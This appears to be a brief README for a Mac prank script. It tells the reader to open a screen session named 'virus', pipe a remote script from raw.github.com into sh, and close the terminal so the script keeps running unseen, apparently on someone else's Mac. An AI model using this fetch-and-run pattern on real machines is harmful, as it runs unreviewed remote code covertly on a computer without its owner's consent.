=====

A harmless prank that can be put on a Mac. Make sure to run it in screen.

This was written on an iPhone.

Instructions
------------
Run the following commands:

```shell
screen -S virus
curl https://raw.github.com/simplyianm/osx-prank/master/prank.sh | sh
```
Then close the terminal window.

**NOTE:** This prank is difficult to execute quickly since this URL is so long. Maybe if I could host it from a domain in the future...
